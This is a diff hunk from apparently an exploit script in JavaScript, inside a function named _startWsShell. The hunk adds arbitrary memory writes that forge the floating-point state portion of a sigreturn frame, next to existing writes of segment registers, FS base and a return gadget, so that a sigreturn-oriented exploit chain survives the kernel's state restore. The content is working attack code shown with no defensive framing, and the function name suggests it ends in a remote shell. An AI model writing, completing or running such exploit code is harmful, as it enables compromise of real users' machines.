@@ -5567,6 +5567,31 @@ function _startWsShell(){
             S.absWrite(CAP+0x100n,0x3Bn);              /* SS */
             S.absWrite(CAP+0x110n,0x10002n);           /* type */
             S.absWrite(CAP+0x118n,0x20001n);           /* subtype */
+            /* THE FP STATE (srop32): the kernel's sigreturn ALSO restores
+             * the FP state (xrstor) from the frame's +0x140+ area - the
+             * scope's ORIGINAL content there = the marker garbage = the
+             * #GP inside the kernel = the silent death. THE 814a
+             * CONSTANTS = a REAL captured FP state (the neighbor slots,
+             * past the 0xC0 marker buffer = collision-free writes). */
+            S.absWrite(CAP+0x140n,0x20037Fn);
+            S.absWrite(CAP+0x148n,0n);
+            S.absWrite(CAP+0x150n,0n);
+            S.absWrite(CAP+0x158n,0x2FFFF00009FE5n);
+            S.absWrite(CAP+0x160n,0n);
+            S.absWrite(CAP+0x168n,0xFFFFn);
+            S.absWrite(CAP+0x170n,0n);
+            S.absWrite(CAP+0x178n,0xFFFFn);
+            S.absWrite(CAP+0x180n,0n);
+            S.absWrite(CAP+0x188n,0xFFFFn);
+            S.absWrite(CAP+0x190n,0n);
+            S.absWrite(CAP+0x198n,0xFFFFn);
+            S.absWrite(CAP+0x1A0n,0n);
+            S.absWrite(CAP+0x1A8n,0xFFFFn);
+            S.absWrite(CAP+0x1D0n,0x8180000000000000n);
+            S.absWrite(CAP+0x1D8n,0x4007n);
+            S.absWrite(CAP+0x230n,0x3FF0000000000000n);
+            S.absWrite(CAP+0x270n,0xFFFFFFFFFFFFFFFFn);
+            S.absWrite(CAP+0x278n,0xFFFFFFFFFFFFFFFFn);
             S.absWrite(CAP+0x480n,fsB);                /* THE FS BASE FIX */
             S.absWrite(CAP+0x488n,0n);                 /* GS base */
             S.absWrite(CAP+0x0E0n,retGadget);
